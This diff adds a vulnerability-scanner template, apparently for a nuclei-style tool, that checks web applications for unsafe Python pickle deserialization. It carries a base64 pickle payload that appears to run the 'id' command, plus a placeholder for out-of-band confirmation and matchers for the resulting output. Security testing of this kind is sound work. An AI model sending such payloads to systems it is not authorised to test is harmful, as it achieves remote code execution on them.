@@ -1,0 +1,23 @@
+id: python-pickle
+info:
+  name: "Python Pickle Deserialization"
+  severity: high
+  description: "Detects Python pickle/marshal deserialization with OOB confirmation"
+  tags: [deserialization, python, pickle, rce, gadget]
+  author: Wired
+
+inject: body
+detection: pattern
+
+payloads:
+  # Base64-encoded minimal pickle payloads
+  - "gASVGwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="
+
+oob_payloads:
+  - "{{OOB_URL}}"
+
+matchers:
+  body_patterns:
+    - "(?i)pickle\\.loads"
+    - "(?i)_pickle\\.UnpicklingError"
+    - "uid=[0-9]+.*gid=[0-9]+"
